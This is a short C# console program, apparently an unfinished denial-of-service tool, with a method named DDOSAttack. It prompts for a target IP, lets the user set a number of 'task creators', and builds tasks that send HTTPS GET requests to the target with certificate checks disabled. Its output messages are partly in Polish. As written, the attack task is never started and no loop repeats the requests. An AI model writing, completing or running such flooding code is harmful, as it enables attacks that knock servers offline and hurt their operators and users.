using System.Globalization;
using RestSharp;

namespace AttackCLI
{
    class Program
    {

        static void Main(string[] args)
        {

            DDOSAttack();

        }



        static void DDOSAttack()
        {
            var ipToAttack = "";
            Task attackCreator = null;
            List<Task> runningTasks = new List<Task>();
            int numberOfTaskCreators = 1;

            if (string.IsNullOrEmpty(ipToAttack))
            {
                Console.Write("Please enter a valid IP address to attack:");
                ipToAttack = Console.ReadLine();
            }


            Console.WriteLine($"Do tou want to chane number of Task Creators ({numberOfTaskCreators}):\n (yes/no)");
            if (Console.ReadLine() == "yes")
            {
                Console.WriteLine("Enter new number :");
                int newNumber = int.Parse(Console.ReadLine());
                numberOfTaskCreators = newNumber is > 1 and < 100 ? newNumber : 1;
            }
            Console.WriteLine($"Uruchamiam attack na ip: https://{ipToAttack}");
            attackCreator = new Task(() =>
            {
                var task = new Task(() =>
                {
                    using var client = new RestClient($"https://{ipToAttack}", options =>
                    {
                        options.Timeout = TimeSpan.FromSeconds(1);
                        options.RemoteCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => true;
                    });
                    try
                    {
                        
                        client.Get(new RestRequest(""));
                        Console.Write("Dziab!");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error: {ex.Message}");
                    }


                });
                task.Start();
                runningTasks.Add(task);
            });
        }
    }
}